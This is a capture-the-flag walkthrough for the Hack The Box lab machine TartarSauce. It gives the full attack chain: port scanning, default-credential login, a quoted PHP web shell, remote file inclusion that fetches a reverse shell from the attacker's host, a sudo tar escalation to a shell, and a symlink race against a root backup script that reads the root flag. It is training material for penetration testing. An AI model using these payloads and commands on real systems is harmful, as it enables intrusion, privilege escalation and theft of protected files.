# TartarSauce

**Machine ip:** 10.10.10.88

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.88 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.88`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e468c3a4-979b-4729-8cd7-db225339bf95)

+ The result shows that only 1 TCP port is open:
```
Port 80: Apache httpd 2.4.18
```

+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.88/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a3fed0d-ed3c-4538-ab8f-86b7cdd88fa8)

+ There's nothing interesting on the home page. Check the **robots.txt** file.
+ **robots.txt** gives a list of URLs that web robots are instructed not to visit.
+ Navigate to `http://10.10.10.88/robots.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1422866c-9dd2-4e85-a981-5bff15e6bf6c)

+ Discovered a **Monstra Content Management System (CMS)**, and the version number is **3.0.4**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/398c8557-d481-432f-8698-eb87791097ae)

+ Check whether it has any exploits.
+ `searchsploit monstra 3.0.4`
+ It's vulnerable to an authenticated RCE exploit. But firstly, it's a must to find credentials.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/45ee5d57-f857-4376-a13b-28698b5f264a)

+ Navigate to `http://10.10.10.88/webservices/monstra-3.0.4/admin/`
+ As always, try default values `admin`:`admin`
+ OK, we successfully logged on with `admin`:`admin`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ca184f3-7767-4244-8475-72d37a2ce9d5)

+ Now, transfer the exploit: `searchsploit -m 43348`
+ Check the exploit:
```
Exploit Title: Monstra CMS - 3.0.4 RCE
Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                                 'php', 'phtml', 'php3', 'php4', 'php5',
'phps',
                                 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh',
'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
                                 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat',
'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

           <?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.


Recommended Patch:
We were not able to get the vendor to respond in any way, the software
appears to have been left abandoned without support – though this is not an
official status on their site (last official patch was released on
2012-11-29), the GitHub appears a bit more active (last commit from 2 years
ago).

The patch that addresses this bug is available here:
 https://github.com/monstra-cms/monstra/issues/426
```

+ Create a **cmd.php7** file, and upload:
```
<?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>
```

+ Capture the upload request on burp, and follow redirection.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0d7592bb-90be-42c8-9920-316bf344e32a)

+ It gives an error, "File was not uploaded". It's a rabbit hole, and skip it.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9a731e3d-2f19-42ac-9543-225ae5552b4c)

+ Do more enumeration.
+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/ -k -n -x html,php,txt -r -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6dfdf757-416d-4211-95ef-2e88d405f356)

+ When trying to access the **webservices** directory gives a 403 forbidden status code.
+ Run gobuster one more time on the **webservices** directory.
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/webservices -k -n -x html,php,txt -r -t 50
```

+ **wp** directory discovered under webservices.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d5fb65f7-640b-4e1e-a939-2e9f1c1c6cc5)

+ Navigate to `http://10.10.10.88/webservices/wp/`, and it's a wordpress application.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ed217df8-091e-41ea-baff-b67d0dcf8206)

+ View page source, and see tartarsauce.htb links. 

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cbcfbf29-64f8-476f-8d65-deaa7c0e03b0)

+ Add **tartarsauce.htb** into /etc/hosts file, and check one more time again. There's nothing interesting here.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b6a4373-c567-43c9-ba70-54a862f0de0e)

+ Run wpscan adding **--plugins-detection aggressive** to enumerate plugins, themes, and users:
```
wpscan --url http://10.10.10.88/webservices/wp/ -e u,ap --plugins-detection aggressive
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5967d7d3-7050-4bef-b957-15648818260a)

+ Check **gwolle** plugin whether it is vulnerable: `searchsploit gwolle`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a09586d5-f4a6-4338-83bc-7be62342d4da)

+ It is vulnerable to a remote file inclusion (RFI), and transfer it into your kali attack vm: `searchsploit -m 38861`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/62b7937a-5b63-4033-9776-711f35bacc24)

+ Check the vulnerability.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab590840-a92a-4baf-8fac-ec2c3e5dc227)

+ There's a RFI vulnerability in **http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path**

## Gaining Access
+ Create a reverse-shell, and name it **wp-load.php** on your kali attack vm: `cp /usr/share/webshells/php/php-reverse-shell.php wp-load.php`
+ Specify ip and port.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a21411f-21af-4307-82ff-279894963d88)
 
+ Serve it with SimpleHTTPServer where the shell is located: `sudo python3 -m http.server`
+ Set up a netcat listener on the attack machine to receive the reverse shell: `nc -lnvp 4444`
+ Navigate to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/` on your browser.
+ Get the shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bb683987-310f-44f3-8080-66e93bab3ac8)

+ **Alternatively**, get shell using **curl**:
```
curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/
```

+ Do more stable shell:
```
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

+ There is no privilege to read the user flag of onuma. Escalate the privileges.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7eaa5593-8c55-4c9f-bfab-61dbf1a28f98)


## Privilege Escalation: from 'www-data' to 'onuma'
+ View commands the user can run using sudo without a password: `sudo -l`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/70b504a7-b501-4227-a809-3ec1a9f4535a)

+ User **www-data** can run **sudo** with **no** password and with **onuma's privileges** for **/bin/tar**.
+ Check gtfobins for [tar](https://gtfobins.github.io/gtfobins/tar/), and [sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)
+ Run the command to get a shell with onuma's privileges:
```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

+ Get the onuma's shell, and user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/18610516-2939-4b21-b7eb-31b9bd6d80bd)


## Privilege Escalation: from 'onuma' to 'root' (No root shell here!)
+ Transfer [pspy32](https://github.com/DominicBreuker/pspy/releases) to the target.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b023d1f-6172-4a79-b4ae-586a6e56fde8)

+ And run: `./pspy32`
+ It shows a script **/usr/sbin/backuperer** and a scheduled task that runs as root every 5 minutes.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0642ba4-bd97-4c02-b0ff-5a4176d6fe41)

+ Check **backuperer.timer** files, and see it runs every 5 minutes.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/60a9fe10-19fc-4a52-b8e5-4f121de388a5)

+ Examine the script what is doing.
```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

+ Let's it divide into the code blocks:

+ **1.** Putting directories into variables.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/439e13f0-5369-46df-8611-12c53fe84cef)

+ **2.** Creating a file using the $tmpdir variable path (i.e. /var/tmp) + sha1sum hash, also declaring check variable to contain $tmpdir path, inside that path there will be new directory called **check**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/55add5f6-156e-42f5-8966-3becd94bee79)

+ **3.** Before starting, it cleans the $tmpdir from any files start with **.** and delete $check directory (i.e. /var/tmp/check).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a126b40f-eceb-4243-a387-ba4e6a6440ef)

+ **4.** Here where the real work start, with zipping using tar command the $basedir (i.e./var/www/html) to the file $tmpfile which is a tar zipped file with sha1sum naming and starts with **.**, here is how it looks like: `.e84f032e69e2e221528b5c1c2ea7fa946a905584`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fecc28bd-1792-459a-bae2-057b02fc4271)

+ **5.** After creating the zip, it sleeps for 30 seconds, this is for if they have big files to zip.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1c6fbce7-b632-447f-b54a-ca027e9ecfdf)

+ **6.** Here we have integrity_chk() function which is not called yet, it compares $basedir to the $check$basedir to see if there is any differences, if there is a difference that means there is an attack (as they are thinking).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d18dedb7-f023-4fc0-b78e-8412c2fee4bf)

+ **7.** Now the script creating check directory and decompress the tar zip file into it (i.e. /var/tmp/check).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c69d4dc4-8dd3-4d2f-9e6c-3bc99e499106)

+ **8.** Now the function from step (6) is called, and it’s used to find any differences as we discussed.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/80d8866b-a2fa-4d09-ba4e-31bed31ac739)

+ **9.** If there is any differences, the decompressed files inside $check will be kept there, so the developers team can check it later and see what happened, but they only have 5 minutes to check because the script will run again and delete $check directory.
 
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5878fa90-f7e4-4d0f-802f-d8a5647faa31)

+ If there is nothing reported, the zip will be added to $bkpdir/onuma-www-dev.bak and $check directory will be removed.

+ **We didn't get the root shell here.**

## Getting 'root flag'
+ We can see the script is run at five minute intervals by inspecting **/var/backups/onuma_backup_test.txt**, and observing the last run timestamp.
+ Monitor for the creation of **$tmpfile** : **/var/tmp/.{randomized_chars}**
+ Once this file is created, we have **30 seconds** to create a condition where **integrity_chk()** will produce some output.
+ Once **$tmpfile** is created, symbolically link **/root/root.txt**

+ **until** the **find** command finds a file name starting with **.** in **/var/tmp** sleep for 3 seconds in a continuous loop.
+ Once that is done, the next series of commands will be run.
```
until [[ $(find /var/tmp/ -maxdepth 1 -type f -name '.*') ]] ; do sleep 3 ; done ;
```
 
+ Backup the original **robots.txt** file to the **/tmp** directory.
+ Create a symbolic link of **/root/root.txt** to **/var/www/html/robots.txt**.
+ Then, once **integrity_chk()** compares **/var/www/html** to **/var/tmp/check/var/www/html**, the **robots.txt** in **/var/tmp/check** will be different from those in **/var/www/html** and the differential lines will be written to the error log.
```
mv /var/www/html/robots.txt /tmp/robots.txt ; 
ln -s /root/root.txt /var/www/html/robots.txt ;
```

+ This last part is just a bit of cleanup. Until the **/usr/sbin/backuperer** process exits, repeatedly sleep for 3 seconds.
+ Then, cleanup the symbolic links and restore the original files from **/tmp**.
```
until [[ ! $(ps aux | grep backuperer | grep -v grep) ]] ; do sleep 3 ; done ; unlink /var/www/html/robots.txt ; mv /tmp/robots.txt /var/www/html/robots.txt ; cat /var/backups/onuma_backup_error.txt 
```

+ Get the **root flag** using one-liner command.
```
until [[ $(find /var/tmp/ -maxdepth 1 -type f -name '.*') ]] ; do sleep 3 ; done ; mv /var/www/html/robots.txt /tmp/robots.txt ; ln -s /root/root.txt /var/www/html/robots.txt ; until [[ ! $(ps aux | grep backuperer | grep -v grep) ]] ; do sleep 3 ; done ; unlink /var/www/html/robots.txt ; mv /tmp/robots.txt /var/www/html/robots.txt ; cat /var/backups/onuma_backup_error.txt 
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/af638d09-99ef-479d-b797-32ef38eb553c)


# References & Alternatives
+ https://vvmlist.github.io/#TartarSauce
+ https://benheater.com/hackthebox-tartarsauce/#evaluating-the-backup-script
+ https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/tartarsauce-writeup-w-o-metasploit
+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/tartarsauce
+ https://medium.com/@toneemarqus/tartarsauce-htb-manual-walkthrough-2023-oscp-journey-5345d381416d
+ https://blog.yekki.co.uk/htb-tartarsauce/
